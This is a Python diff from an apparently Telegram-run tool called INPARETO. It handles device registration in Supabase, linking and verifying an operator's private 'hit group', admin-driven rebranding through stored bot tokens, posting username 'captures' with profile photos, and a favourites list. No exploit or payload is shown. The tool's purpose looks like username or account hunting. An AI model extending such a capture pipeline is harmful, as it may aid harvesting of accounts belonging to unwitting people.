+    return read_local_hit_group_owner()
+
+
+def _post_devices_row(payload, *, prefer="resolution=merge-duplicates"):
+    """POST devices upsert; retry without owner column if Supabase schema lacks it."""
+    url = f"{SUPABASE_URL}/rest/v1/devices?on_conflict=device_hash"
+    headers = supabase_headers(prefer)
+    body = dict(payload)
+    try:
+        response = requests.post(
+            url, headers=headers, json=body, timeout=CLOUD_TIMEOUT,
+        )
+        if response.ok:
+            return None
+        err = response.text[:400]
+        if _supabase_missing_column(err, "operator_hit_group_operator_id"):
+            mark_cloud_no_hit_group_owner_column()
+            body.pop("operator_hit_group_operator_id", None)
+            response = requests.post(
+                url, headers=headers, json=body, timeout=CLOUD_TIMEOUT,
+            )
+            if response.ok:
+                return None
+            return response.text[:200]
+        return err[:200]
+    except Exception as exc:
+        return str(exc)[:120]
+
+
+def get_operator_bot_id(bot_token=None):
+    token = (bot_token or TELEGRAM_BOT_TOKEN or "").strip()
+    if not token:
+        return None
+    if token in _operator_bot_id_cache:
+        return _operator_bot_id_cache[token]
+    response, err = operator_bot_api_post(token, "getMe")
+    if err or not response or not response.ok:
+        return None
+    try:
+        bot_id = response.json().get("result", {}).get("id")
+    except Exception:
+        return None
+    if bot_id:
+        _operator_bot_id_cache[token] = bot_id
+    return bot_id
+
+
+def refresh_operator_hit_group_cache():
+    return reconcile_operator_hit_group()
+
+
+def get_operator_hit_group_id():
+    global _cached_hit_group_id
+    local_gid = read_local_hit_group_id()
+    if local_gid:
+        owner = read_local_hit_group_owner()
+        current = str(resolve_operator_telegram_id() or "").strip()
+        if owner and current and owner != current:
+            clear_local_hit_group_id()
+            clear_local_hit_group_owner()
+            _cached_hit_group_id = None
+        else:
+            if current and not owner:
+                persist_local_hit_group_owner(current)
+        _cached_hit_group_id = local_gid
+        return local_gid
+    if _cached_hit_group_id:
+        return _cached_hit_group_id
+    if has_local_operator_session() and is_cloud_enabled():
+        chat_id = resolve_operator_telegram_id()
+        if chat_id:
+            inherited = fetch_operator_hit_group_id_for_telegram_user(chat_id)
+            if inherited:
+                persist_local_hit_group_id(inherited)
+                persist_local_hit_group_owner(chat_id)
+                _cached_hit_group_id = inherited
+                return inherited
+    if _cached_hit_group_id is None:
+        refresh_operator_hit_group_cache()
+    return _cached_hit_group_id or None
+
+
+def update_device_fields(device_hash, **fields):
+    if not is_cloud_enabled():
+        return "Cloud offline"
+    device_hash = (device_hash or "").strip()
+    if not device_hash:
+        return "No device hash"
+    existing, err = fetch_device_record(device_hash)
+    if err:
+        return err
+    if not existing:
+        return "No device record"
+
+    owner_in = fields.get("operator_hit_group_operator_id")
+    if owner_in:
+        persist_local_hit_group_owner(owner_in)
+    if fields.get("operator_hit_group_id") is None and "operator_hit_group_id" in fields:
+        clear_local_hit_group_id()
+        clear_local_hit_group_owner()
+
+    payload = {"device_hash": device_hash}
+    allowed = (
+        "telegram_bot_token",
+        "telegram_chat_id",
+        "display_name",
+        "hostname",
+        "api_host",
+        "api_public_ip",
+        "api_port",
+        "operator_hit_group_id",
+        "operator_hit_group_operator_id",
+    )
+    for key in allowed:
+        if key == "operator_hit_group_operator_id" and not cloud_supports_hit_group_owner_column():
+            continue
+        if key in fields:
+            payload[key] = fields[key]
+        elif existing.get(key) is not None:
+            payload[key] = existing[key]
+
+    post_err = _post_devices_row(payload)
+    if post_err:
+        return _parse_supabase_error(post_err)
+    if device_hash == DEVICE_HASH and (
+        "operator_hit_group_id" in fields
+        or "operator_hit_group_operator_id" in fields
+    ):
+        refresh_operator_hit_group_cache()
+    return None
+
+
+def set_operator_hit_group_id(group_id):
+    gid = str(group_id or "").strip()
+    owner = resolve_operator_telegram_id()
+    if not gid or not owner:
+        return "No group or Telegram ID"
+    persist_local_hit_group_id(gid)
+    persist_local_hit_group_owner(owner)
+    global _cached_hit_group_id
+    _cached_hit_group_id = gid
+    invalidate_operator_gate_cache()
+
+    def _cloud_hit_group_sync():
+        user_hit_group_set(owner, gid)
+
+    threading.Thread(target=_cloud_hit_group_sync, daemon=True, name="hg-cloud").start()
+    return None
+
+
+def clear_operator_hit_group_id():
+    owner = resolve_operator_telegram_id()
+    clear_local_hit_group_id()
+    clear_local_hit_group_owner()
+    global _cached_hit_group_id
+    _cached_hit_group_id = None
+    invalidate_operator_gate_cache()
+    if owner:
+        user_hit_group_clear(owner)
+    if not owner or not is_cloud_enabled():
+        return
+    data, _ = supabase_request(
+        "GET",
+        "devices",
+        params={
+            "telegram_chat_id": f"eq.{owner}",
+            "select": "device_hash",
+            "limit": "25",
+        },
+    )
+    for row in data or []:
+        dh = str(row.get("device_hash") or "").strip()
+        if not dh or dh.endswith("-OUT"):
+            continue
+        patch = {"operator_hit_group_id": None}
+        if cloud_supports_hit_group_owner_column():
+            patch["operator_hit_group_operator_id"] = None
+        update_device_fields(dh, **patch)
+
+
+def operator_bot_chat_member_status(group_id, bot_token=None):
+    token = (bot_token or TELEGRAM_BOT_TOKEN or "").strip()
+    bot_id = get_operator_bot_id(token)
+    if not bot_id or not group_id:
+        return None, "missing bot or group"
+    response, err = operator_bot_api_post(
+        token,
+        "getChatMember",
+        {"chat_id": str(group_id), "user_id": bot_id},
+        timeout=HIT_GROUP_MEMBER_TIMEOUT,
+    )
+    if err:
+        return None, err
+    if not response or not response.ok:
+        return None, (response.text[:80] if response else "getChatMember failed")
+    try:
+        return response.json().get("result", {}), None
+    except Exception as exc:
+        return None, str(exc)[:60]
+
+
+def mark_hit_group_verified_by_delivery():
+    """Successful hit post proves the bot can message the linked group."""
+    global _hit_group_last_delivery_at
+    gid = get_operator_hit_group_id()
+    if not gid:
+        return
+    _hit_group_last_delivery_at = time.time()
+    _hit_group_admin_cache.update(gid=str(gid), ok=True, at=time.time())
+    mark_operator_access_verified()
+    invalidate_operator_gate_cache()
+    dismiss_hit_group_gate_messages()
+
+
+def hit_group_recently_delivered(within_sec=7200):
+    return (
+        _hit_group_last_delivery_at > 0
+        and time.time() - _hit_group_last_delivery_at < within_sec
+    )
+
+
+def operator_bot_is_group_admin(group_id, bot_token=None):
+    member, err = operator_bot_chat_member_status(group_id, bot_token)
+    if err:
+        log_event("HITGRP MEMBER", str(err)[:80])
+        return False
+    if not member:
+        return False
+    status = member.get("status", "")
+    if status == "creator":
+        return True
+    if status == "administrator":
+        if member.get("is_anonymous"):
+            return False
+        post = member.get("can_post_messages")
+        if post is True:
+            return True
+        if post is False:
+            return bool(
+                member.get("can_manage_chat")
+                or member.get("can_change_info")
+                or member.get("can_delete_messages")
+                or member.get("can_pin_messages")
+                or member.get("can_invite_users")
+                or member.get("can_manage_topics")
+            )
+        # Supergroups often omit can_post_messages; bot can still send hits.
+        return True
+    return False
+
+
+def apply_operator_hit_group_branding(group_id, bot_token=None):
+    """Apply admin-defined title, description & photo to an operator hit group."""
+    admin_load_settings()
+    token = (bot_token or TELEGRAM_BOT_TOKEN or "").strip()
+    gid = str(group_id or "").strip()
+    if not token or not gid:
+        return False, "No bot token or group id"
+
+    title = (_admin_settings.get("operator_hit_group_title") or "").strip()
+    desc = (_admin_settings.get("operator_hit_group_description") or "").strip()
+    photo_url = (_admin_settings.get("operator_hit_group_photo_url") or "").strip()
+    steps = []
+    errors = []
+
+    if title:
+        response, err = operator_bot_api_post(
+            token, "setChatTitle", {"chat_id": gid, "title": title[:128]},
+        )
+        if err:
+            errors.append(f"title: {err}")
+        elif response and response.ok:
+            steps.append("title")
+        else:
+            errors.append(f"title: {(response.text[:80] if response else 'failed')}")
+
+    if desc:
+        response, err = operator_bot_api_post(
+            token, "setChatDescription", {"chat_id": gid, "description": desc[:255]},
+        )
+        if err:
+            errors.append(f"desc: {err}")
+        elif response and response.ok:
+            steps.append("description")
+        else:
+            errors.append(f"desc: {(response.text[:80] if response else 'failed')}")
+
+    if photo_url:
+        try:
+            image_response = session.get(photo_url, timeout=20)
+            if not image_response.ok or not image_response.content:
+                errors.append("photo: download failed")
+            else:
+                content_type = image_response.headers.get("Content-Type", "image/jpeg")
+                ext = "jpg" if "png" not in content_type.lower() else "png"
+                files = {"photo": (f"group.{ext}", image_response.content, content_type)}
+                response, err = operator_bot_api_post(
+                    token, "setChatPhoto", {"chat_id": gid}, files=files,
+                )
+                if err:
+                    errors.append(f"photo: {err}")
+                elif response and response.ok:
+                    steps.append("photo")
+                else:
+                    errors.append(f"photo: {(response.text[:80] if response else 'failed')}")
+        except Exception as exc:
+            errors.append(f"photo: {str(exc)[:60]}")
+
+    if not steps and not errors:
+        return False, "No hit-group branding configured (use /set opgrouptitle …)"
+    if errors and not steps:
+        return False, "; ".join(errors)
+    detail = ", ".join(steps)
+    if errors:
+        detail += f" · warnings: {'; '.join(errors)}"
+    return True, detail
+
+
+def rebrand_all_operator_hit_groups():
+    devices, err = admin_fetch_all_devices()
+    if err:
+        return f"Hit groups: failed — {err}"
+    groups = {}
+    for row in devices:
+        gid = str(row.get("operator_hit_group_id") or "").strip()
+        token = (row.get("telegram_bot_token") or "").strip()
+        if gid and token:
+            groups[(gid, token)] = True
+    if not groups:
+        return "Hit groups: none linked yet."
+    ok_count = 0
+    fail = []
+    for (gid, token) in groups:
+        success, msg = apply_operator_hit_group_branding(gid, token)
+        if success:
+            ok_count += 1
+        else:
+            fail.append(msg[:40])
+    line = f"Hit groups: rebranded {ok_count}/{len(groups)}."
+    if fail:
+        line += f" Fail: {fail[0]}"
+    return line
+
+
+def invalidate_operator_gate_cache():
+    _operator_gate_cache["ok"] = None
+    _operator_gate_cache["at"] = 0.0
+    _hit_group_admin_cache["ok"] = None
+    _hit_group_admin_cache["at"] = 0.0
+
+
+def mark_operator_access_verified():
+    global _operator_access_sticky_until, _access_trust_ok_at
+    now = time.time()
+    _operator_access_sticky_until = now + OPERATOR_ACCESS_STICKY_SEC
+    _access_trust_ok_at = now
+    persist_operator_session_verified()
+
+
+def _access_trust_grace_active():
+    """Keep hunt/bot alive through short cloud/TG outages after a verified session."""
+    if operator_access_sticky_active():
+        return True
+    return (time.time() - float(_access_trust_ok_at or 0)) < ACCESS_TRUST_GRACE_SEC
+
+
+def operator_access_sticky_active():
+    return time.time() < _operator_access_sticky_until
+
+
+def operator_hit_group_access_state(*, force=False):
+    """Hit group gate keyed by Telegram id + local .inpareto_hit_group file."""
+    if force or not get_operator_hit_group_id():
+        reconcile_operator_hit_group()
+    gid = get_operator_hit_group_id()
+    if not gid:
+        return False, "no_hit_group"
+    now = time.time()
+    if (
+        not force
+        and _hit_group_admin_cache["gid"] == str(gid)
+        and _hit_group_admin_cache["ok"] is not None
+        and now - _hit_group_admin_cache["at"] < HIT_GROUP_ADMIN_TTL
+    ):
+        if _hit_group_admin_cache["ok"]:
+            return True, None
+        if hit_group_recently_delivered():
+            mark_hit_group_verified_by_delivery()
+            return True, None
+        return False, "not_admin"
+    is_admin = operator_bot_is_group_admin(gid)
+    if not is_admin and (
+        hit_group_recently_delivered()
+        or operator_access_sticky_active()
+    ):
+        is_admin = True
+    _hit_group_admin_cache.update(gid=str(gid), ok=is_admin, at=now)
+    if not is_admin:
+        return False, "not_admin"
+    return True, None
+
+
+def format_hit_group_gate_message(reason="no_hit_group"):
+    lines = [
+        format_panel_header(),
+        f"<b>{S['brand']} Hit Group Required</b>\n\n",
+        "<i>Captures post to your private hit group — not this DM inbox.</i>\n"
+        "<i>Required for every operator, including admins.</i>\n\n",
+    ]
+    if reason == "not_admin":
+        gid = get_operator_hit_group_id() or "—"
+        lines.append(
+            "<b>Bot needs admin rights in your hit group.</b>\n\n"
+            f"  {S['bullet']} Open the group → bot → <b>Promote to admin</b>\n"
+            f"  {S['bullet']} Enable <b>Post messages</b> and <b>Change group info</b>\n"
+            f"  {S['bullet']} Linked group: <code>{html.escape(str(gid))}</code>\n\n"
+            "<i>If hits already appear in that group, tap <b>Verify hit group</b> below "
+            "or send <code>/verifyhitgroup</code> — detection will refresh.</i>\n"
+        )
+    else:
+        lines.append(
+            "<b>Create a Telegram group and add your operator bot.</b>\n\n"
+            f"  {S['bullet']} New group → add <b>your</b> @BotFather bot\n"
+            f"  {S['bullet']} Promote the bot to <b>admin</b> immediately\n"
+            f"  {S['bullet']} Only you (this account) should add the bot\n\n"
+            "<i>/hitgroup or /verifyhitgroup here in the group, or in bot DM</i>\n"
+        )
+    lines.append(f"<i>Channel: {admin_channel_tag()}</i>")
+    return "".join(lines)
+
+
+def hit_group_gate_keyboard():
+    return {"inline_keyboard": [[{"text": "Verify hit group", "callback_data": "VERIFY_HITGROUP"}]]}
+
+
+def format_hit_group_setup_message():
+    gid = get_operator_hit_group_id()
+    ok, reason = operator_hit_group_access_state(force=True)
+    if not gid:
+        state = "not linked"
+    elif ok:
+        state = "verified · bot can post"
+    elif reason == "not_admin":
+        state = "linked · promote bot to admin"
+    else:
+        state = f"linked · {reason}"
+    return (
+        format_panel_header()
+        + f"<b>{S['btn_hits']} Your Hit Group</b>\n\n"
+        + "<i>All live captures are delivered here — not to your private chat.</i>\n\n"
+        + tg_row("Linked group", gid if gid else "—")
+        + tg_row("Status", state)
+        + "\n<b>Setup</b>\n"
+        + f"  {S['bullet']} Create a group · add your operator bot\n"
+        + f"  {S['bullet']} Promote bot to <b>admin</b> (post + change info)\n"
+        + f"  {S['bullet']} Send <code>/verifyhitgroup</code> <b>in the hit group</b> (best) or here in DM\n"
+        + f"  {S['bullet']} Group privacy ON → <code>/verifyhitgroup@YourBot</code>\n"
+        + f"  {S['bullet']} <code>/setgroup</code> = same as <code>/hitgroup</code>\n\n"
+        + "<i>Linked ≠ verified — run verify after promoting the bot.</i>"
+    )
+
+
+def _is_hit_group_gate_text(text):
+    return bool(text and "Hit Group Required" in text)
+
+
+def register_hit_group_gate_message(response):
+    mid = telegram_sent_message_id(response)
+    if not mid:
+        return
+    with _hit_group_gate_lock:
+        ids = _hit_group_gate_state["message_ids"]
+        if mid not in ids:
+            ids.append(mid)
+        _hit_group_gate_state["message_ids"] = ids[-10:]
+        _hit_group_gate_state["last_edit_id"] = mid
+
+
+def dismiss_hit_group_gate_messages(except_message_id=None):
+    """Remove stacked 'Hit group required' prompts after successful verify."""
+    if not TELEGRAM_ENABLED or not TELEGRAM_CHAT_ID:
+        return
+    except_id = int(except_message_id) if except_message_id else None
+    with _hit_group_gate_lock:
+        ids = list(_hit_group_gate_state["message_ids"])
+        _hit_group_gate_state["message_ids"].clear()
+        _hit_group_gate_state["last_edit_id"] = None
+    for mid in ids:
+        if except_id is not None and mid == except_id:
+            continue
+        delete_telegram_message(TELEGRAM_CHAT_ID, mid)
+
+
+def send_hit_group_gate_reply(text, reply_markup=None, *, force=False):
+    """One gate banner: edit in place when possible, throttle duplicate sends."""
+    if not TELEGRAM_ENABLED:
+        return None
+    target_chat = operator_reply_chat_id()
+    now = time.time()
+    with _hit_group_gate_lock:
+        last_at = _hit_group_gate_state["last_send_at"]
+        edit_id = _hit_group_gate_state["last_edit_id"]
+    if edit_id and str(target_chat) == str(TELEGRAM_CHAT_ID or ""):
+        resp = edit_telegram_message(
+            TELEGRAM_CHAT_ID, edit_id, text, reply_markup=reply_markup,
+        )
+        if _telegram_api_ok(resp):
+            with _hit_group_gate_lock:
+                _hit_group_gate_state["last_send_at"] = now
+            return resp
+    if not force and now - last_at < HIT_GROUP_GATE_SEND_COOLDOWN:
+        return send_telegram_text(text, reply_markup=reply_markup, chat_id=target_chat)
+    resp = send_telegram_text(text, reply_markup=reply_markup, chat_id=target_chat)
+    register_hit_group_gate_message(resp)
+    with _hit_group_gate_lock:
+        _hit_group_gate_state["last_send_at"] = now
+    return resp
+
+
+def notify_operator_setup(text):
+    if not TELEGRAM_ENABLED or not TELEGRAM_CHAT_ID:
+        return
+    if _is_hit_group_gate_text(text):
+        send_hit_group_gate_reply(text, hit_group_gate_keyboard())
+        return
+    send_telegram_text(text)
+
+
+def process_operator_hit_group_link(group_id, actor_id, bot_token=None):
+    """Save group, warn if not admin, apply branding when ready (never blocks poll)."""
+    if not can_control_operator_bot(actor_id):
+        return
+
+    def _link_work():
+        err = set_operator_hit_group_id(group_id)
+        if err:
+            notify_operator_setup(
+                format_action_notice("Hit group save failed", err[:200], "ERR"),
+            )
+            return
+        if operator_bot_is_group_admin(group_id, bot_token):
+            threading.Thread(
+                target=_branding_hit_group_async,
+                args=(group_id,),
+                daemon=True,
+                name="hg-brand-link",
+            ).start()
+            detail = (
+                f"Group {tg_code(group_id)} linked.\n"
+                "<i>Branding applies in the background if configured.</i>"
+            )
+            dismiss_hit_group_gate_messages()
+            notify_operator_setup(
+                format_action_notice("Hit group ready", detail, "OK", detail_html=True),
+            )
+            threading.Thread(
+                target=sync_operator_access, daemon=True, name="hg-sync",
+            ).start()
+        else:
+            notify_operator_setup(
+                format_hit_group_gate_message("not_admin"),
+            )
+
+    threading.Thread(target=_link_work, daemon=True, name="hg-link").start()
+
+
+def handle_operator_my_chat_member(update):
+    mcm = update.get("my_chat_member") or {}
+    chat = mcm.get("chat") or {}
+    chat_type = chat.get("type", "")
+    if chat_type not in ("group", "supergroup"):
+        return
+    group_id = chat.get("id")
+    if not group_id:
+        return
+    actor_id = str((mcm.get("from") or {}).get("id", ""))
+    new_member = mcm.get("new_chat_member") or {}
+    old_member = mcm.get("old_chat_member") or {}
+    new_status = new_member.get("status", "")
+    old_status = old_member.get("status", "")
+
+    if new_status in ("left", "kicked"):
+        if str(get_operator_hit_group_id() or "") == str(group_id):
+            clear_operator_hit_group_id()
+            notify_operator_setup(
+                format_action_notice(
+                    "Hit group unlinked",
+                    "Bot removed from your hit group. Add it again to resume captures.",
+                    "WARN",
+                ),
+            )
+            sync_operator_access()
+        return
+
+    if new_status in ("member", "administrator", "creator"):
+        if old_status in ("left", "kicked", "") or old_status != new_status:
+            process_operator_hit_group_link(group_id, actor_id)
+
+
+def _branding_hit_group_async(group_id):
+    gid = str(group_id or get_operator_hit_group_id() or "").strip()
+    if not gid:
+        return
+    try:
+        apply_operator_hit_group_branding(gid)
+    except Exception as exc:
+        log_event("HITGRP BRAND", str(exc)[:80])
+
+
+def verify_operator_hit_group_access(*, keep_message_id=None, fast=False, group_id=None):
+    """Verify bot admin in hit group. fast=True: one Telegram call, defer cloud/cleanup."""
+    global _cached_hit_group_id
+    if not fast:
+        invalidate_operator_gate_cache()
+    gid = str(group_id or read_local_hit_group_id() or _cached_hit_group_id or "").strip()
+    if not gid and not group_id:
+        gid = str(get_operator_hit_group_id() or "").strip()
+    if group_id and str(group_id) != str(get_operator_hit_group_id() or ""):
+        persist_local_hit_group_id(group_id)
+        persist_local_hit_group_owner(resolve_operator_telegram_id())
+        _cached_hit_group_id = str(group_id)
+        gid = str(group_id)
+
+    if fast and gid:
+        is_admin = operator_bot_is_group_admin(gid)
+        if not is_admin and (
+            hit_group_recently_delivered()
+            or operator_access_sticky_active()
+        ):
+            is_admin = True
+        now = time.time()
+        _hit_group_admin_cache.update(gid=str(gid), ok=is_admin, at=now)
+        if not is_admin:
+            return False, format_hit_group_gate_message("not_admin")
+
+        def _verify_followup():
+            try:
+                dismiss_hit_group_gate_messages(except_message_id=keep_message_id)
+                sync_operator_access()
+                if not paused:
+                    pause_event.set()
+            except Exception as exc:
+                log_event("HG VERIFY", str(exc)[:80])
+
+        mark_operator_access_verified()
+        persist_local_hit_group_id(gid)
+        threading.Thread(target=_verify_followup, daemon=True, name="hg-verify").start()
+        threading.Thread(target=_branding_hit_group_async, args=(gid,), daemon=True).start()
+        threading.Thread(
+            target=lambda: set_operator_hit_group_id(gid),
+            daemon=True,
+            name="hg-cloud",
+        ).start()
+        return True, "Hit group verified — captures will post there."
+
+    if hit_group_recently_delivered():
+        mark_hit_group_verified_by_delivery()
+    ok, reason = operator_hit_group_access_state(force=True)
+    if ok:
+        def _slow_followup():
+            try:
+                dismiss_hit_group_gate_messages(except_message_id=keep_message_id)
+                sync_operator_access()
+            except Exception as exc:
+                log_event("HG VERIFY", str(exc)[:80])
+
+        gid = get_operator_hit_group_id() or gid
+        if gid:
+            persist_local_hit_group_id(gid)
+        mark_operator_access_verified()
+        threading.Thread(target=_slow_followup, daemon=True, name="hg-verify").start()
+        threading.Thread(target=_branding_hit_group_async, args=(gid,), daemon=True).start()
+        return True, "Hit group verified — captures will post there."
+    if reason == "not_admin":
+        gid = get_operator_hit_group_id() or gid
+        if gid and operator_bot_is_group_admin(gid):
+            mark_operator_access_verified()
+            persist_local_hit_group_id(gid)
+            threading.Thread(
+                target=lambda: dismiss_hit_group_gate_messages(except_message_id=keep_message_id),
+                daemon=True,
+            ).start()
+            threading.Thread(target=sync_operator_access, daemon=True).start()
+            threading.Thread(target=_branding_hit_group_async, args=(gid,), daemon=True).start()
+            return True, "Admin rights confirmed — hit group is ready."
+        return False, format_hit_group_gate_message("not_admin")
+    return False, format_hit_group_gate_message("no_hit_group")
+
+
+def deliver_hit_to_operator_group(caption, hit_keyboard, photo_bytes=None, content_type="image/jpeg"):
+    """Post capture to the operator's linked hit group (not DM inbox). Returns (ok, message_id, is_photo)."""
+    if not TELEGRAM_ENABLED:
+        return False, None, False
+    group_id = get_operator_hit_group_id()
+    if not group_id:
+        return False, None, False
+
+    safe_kb = sanitize_inline_keyboard_urls(hit_keyboard)
+    if photo_bytes:
+        data = {
+            "chat_id": group_id,
+            "caption": caption,
+            "parse_mode": "HTML",
+        }
+        if safe_kb:
+            data["reply_markup"] = json.dumps(safe_kb)
+        data = telegram_disable_link_preview(data, "sendPhoto")
+        files = {"photo": ("profile.jpg", photo_bytes, content_type)}
+        resp = telegram_post_with_retries(
+            "sendPhoto",
+            data=data,
+            files=files,
+            timeout=max(TIMEOUT, TG_SEND_TIMEOUT),
+            max_retries=TG_HIT_MAX_RETRIES,
+            label="HIT GRP PHOTO",
+        )
+        if resp is not None:
+            mark_hit_group_verified_by_delivery()
+            return True, _parse_tg_message_id(resp), True
+        log_event("HIT GRP", "photo send failed — falling back to text")
+
+    text_data = {
+        "chat_id": group_id,
+        "text": caption,
+        "parse_mode": "HTML",
+    }
+    if safe_kb:
+        text_data["reply_markup"] = json.dumps(safe_kb)
+    text_data = telegram_disable_link_preview(text_data, "sendMessage")
+    resp = telegram_post_with_retries(
+        "sendMessage",
+        data=text_data,
+        timeout=max(TIMEOUT, TG_SEND_TIMEOUT),
+        max_retries=TG_HIT_MAX_RETRIES,
+        label="HIT GRP MSG",
+    )
+    if resp is not None:
+        mark_hit_group_verified_by_delivery()
+        return True, _parse_tg_message_id(resp), False
+    return False, None, bool(photo_bytes)
+
+
+def is_favorite_username(username):
+    uname = (username or "").strip().lstrip("@").lower()
+    if not uname:
+        return False
+    with profile_lock:
+        profile = load_profile_data()
+    favs = [str(u).lstrip("@").lower() for u in (profile.get("favorites") or [])]
+    return uname in favs
+
+
+def normalize_favorite_username(username):
+    return str(username or "").strip().lstrip("@")
+
+
+def _favorite_notes_local_path():
+    return os.path.join(_device_state_dir(), ".inpareto_favorite_notes.json")
+
+
+def load_local_favorite_notes():
+    data = _read_local_state_json(_favorite_notes_local_path())
+    if not data:
+        return {}
+    try:
+        return {
+            str(k).lstrip("@").lower(): str(v)[:FAV_NOTE_MAX_LEN]
+            for k, v in data.items()
+            if v
+        }
+    except (TypeError, ValueError):
+        return {}
+
+
+def persist_local_favorite_notes(notes):
+    clean = {
+        str(k).lstrip("@").lower(): str(v)[:FAV_NOTE_MAX_LEN]
+        for k, v in (notes or {}).items()
+        if v
+    }
+    _write_local_state_json(_favorite_notes_local_path(), clean)
+
+
+def get_favorite_notes_map(profile=None):
+    if profile is None:
+        with profile_lock:
+            profile = load_profile_data()
+    notes = dict(profile.get("favorite_notes") or {})
+    notes.update(load_local_favorite_notes())
+    return notes
+
+
+def get_favorite_note_for_user(username, profile=None):
+    key = normalize_favorite_username(username).lower()
+    if not key:
+        return ""
+    return (get_favorite_notes_map(profile).get(key) or "").strip()
+
+
+def set_favorite_note(username, note):
+    uname = normalize_favorite_username(username)
+    if not uname:
+        return False
+    key = uname.lower()
+    with profile_lock:
+        profile = load_profile_data()
+        notes = dict(get_favorite_notes_map(profile))
+        text = (note or "").strip()
+        if text:
+            notes[key] = text[:FAV_NOTE_MAX_LEN]
+        else:
+            notes.pop(key, None)
+        profile["favorite_notes"] = notes
+        save_profile_data(profile)
+    persist_local_favorite_notes(notes)
+    sync_favorites_txt(profile)
+    return True
+
+
+def clear_favorite_note_for_user(username):
+    return set_favorite_note(username, None)
+
+
+def set_fav_note_pending(username):
+    uname = normalize_favorite_username(username)
+    with _fav_note_pending_lock:
+        _fav_note_pending["username"] = uname or None
+
+
+def get_fav_note_pending():
+    with _fav_note_pending_lock:
+        return _fav_note_pending.get("username")
+
+
+def clear_fav_note_pending():
+    with _fav_note_pending_lock:
+        _fav_note_pending["username"] = None
+
+
+def favorite_note_prompt_keyboard(username):
+    uname = normalize_favorite_username(username)[:48]
+    return {
+        "inline_keyboard": [[
+            {"text": "Yes", "callback_data": f"FAVNOTE_YES:{uname}"},
+            {"text": "No", "callback_data": f"FAVNOTE_NO:{uname}"},
+        ]],
+    }
+
+
+def send_favorite_note_prompt(username):
+    uname = normalize_favorite_username(username)
+    if not uname or not TELEGRAM_ENABLED:
+        return None
+    text = (
+        format_panel_header()
+        + "<b>★ Added to favorites</b>\n\n"
+        + f"You recently added <b>@{html.escape(uname)}</b> to favourites.\n\n"
+        + "Do you want to add an additional note to this hit?"
+    )
+    return send_telegram_text(text, reply_markup=favorite_note_prompt_keyboard(uname))
+
+
+def try_consume_favorite_note_input(text):
+    uname = get_fav_note_pending()
+    if not uname:
+        return False
+    raw = (text or "").strip()
+    if not raw:
+        return False
+    lower = raw.lower()
+    if lower in {"/cancel", "cancel"}:
+        clear_fav_note_pending()
+        bot_command_reply(
+            format_action_notice(
+                "Note skipped",
+                f"No note saved for @{uname}.",
+                "INFO",
+            ),
+        )
+        return True
+    if raw.startswith("/"):
+        return False
+    set_favorite_note(uname, raw)
+    clear_fav_note_pending()
+    bot_command_reply(
+        format_action_notice(
+            "Note saved",
+            f"@{uname}\nAdditional: {html.escape(raw[:FAV_NOTE_MAX_LEN])}",
+            "OK",
+        ),
+    )
+    return True
+
+
+def toggle_favorite_username(username):
+    uname = normalize_favorite_username(username)
+    if not uname:
+        return False, 0
+    with profile_lock:
+        profile = load_profile_data()
+        favs = list(profile.get("favorites") or [])
+        lower = [str(u).lstrip("@").lower() for u in favs]
+        if uname.lower() in lower:
+            favs = [u for u in favs if str(u).lstrip("@").lower() != uname.lower()]
+            added = False
+            notes = dict(profile.get("favorite_notes") or {})
+            notes.pop(uname.lower(), None)
+            profile["favorite_notes"] = notes
+            persist_local_favorite_notes(notes)
+        else:
+            favs.append(uname)
+            added = True
+        profile["favorites"] = sorted({str(u).lstrip("@") for u in favs if u})
+        save_profile_data(profile)
+        count = len(profile["favorites"])
+    sync_favorites_txt(profile)
+    return added, count
+
+
+def favorites_txt_path():
+    return "favorites.txt"
+
+
+def get_saved_favorites():
+    with profile_lock:
+        profile = load_profile_data()
+    return [str(u).lstrip("@") for u in (profile.get("favorites") or []) if u]
+
+
+def sync_favorites_txt(profile=None):
+    """Write cloud/local favorites list to favorites.txt for /saved export."""
+    with profile_lock:
+        if profile is None:
+            profile = load_profile_data()
+        favs = [str(u).lstrip("@") for u in (profile.get("favorites") or []) if u]
+        notes = dict(profile.get("favorite_notes") or {})
+        notes.update(load_local_favorite_notes())
+    path = favorites_txt_path()
+    stamp = datetime.now(timezone.utc).strftime("%d %b %Y %H:%M UTC")
+    lines = [
+        "INPARETO — Saved favorites (★ Add to fav on hit alerts)",
+        f"Updated: {stamp}",
+        f"Count: {len(favs)}",
+        "",
+    ]
+    if favs:
+        for u in favs:
+            line = f"@{u}"
+            note = (notes.get(u.lower()) or "").strip()
+            if note:
+                line += f"  Additional: {note}"
+            lines.append(line)
+    else:
+        lines.append("(empty)")
+        lines.append("")
+        lines.append("Tap ★ Add to fav on any hit, then send /saved")
+    try:
+        with open(path, "w", encoding="utf-8") as f:
+            f.write("\n".join(lines) + "\n")
+    except OSError as exc:
+        log_event("FAV FILE", str(exc)[:80])
+    return path
+
+
+def format_saved_favorites_message():
+    favs = get_saved_favorites()
+    notes = get_favorite_notes_map()
+    if not favs:
+        return (
+            format_panel_header()
+            + "<b>★ Saved Favorites</b>\n\n"
+            + "<i>No favorites yet.</i>\n\n"
+            + "On a <b>hit alert</b>, tap <b>★ Add to fav</b>.\n"
+            + "Then send <code>/saved</code> to get <code>favorites.txt</code>."
+        )
+    preview_lines = []
+    for u in favs[:25]:
+        line = f"  {S['bullet']} @{html.escape(u)}"
+        note = (notes.get(u.lower()) or "").strip()
+        if note:
+            line += f"\n      <i>Additional:</i> {html.escape(note[:120])}"
+        preview_lines.append(line)
+    preview = "\n".join(preview_lines)
+    extra = ""
+    if len(favs) > 25:
+        extra = f"\n  <i>…and {len(favs) - 25} more in the file</i>"
+    return (
+        format_panel_header()
+        + f"<b>★ Saved Favorites</b>  <code>{len(favs)}</code>\n\n"
+        + preview
+        + extra
+        + "\n\n<i>Sending <code>favorites.txt</code>…</i>"
+    )
+
+
+def export_saved_favorites():
+    favs = get_saved_favorites()
+    if not favs:
+        return bot_command_reply(
+            format_saved_favorites_message(),
+            reply_markup=panel_keyboard("hits"),
+        )
+    path = sync_favorites_txt()
+    if not os.path.isfile(path):
+        return bot_command_reply(
+            format_action_notice("Saved", "Could not write favorites.txt.", "ERR"),
+            reply_markup=panel_keyboard("tools"),
+        )
+    caption = (
+        format_panel_header()
+        + f"<b>★ favorites.txt</b>  — {len(favs)} saved\n"
+        + "<i>Notes appear as: @user  Additional: … · updates on /saved</i>"
+    )
+    return send_telegram_document(path, caption=caption)
+
+
+def rebrand_all_operator_bots():
+    devices, err = admin_fetch_all_devices()
+    if err:
+        return f"Failed: {err}"
+    tokens = {
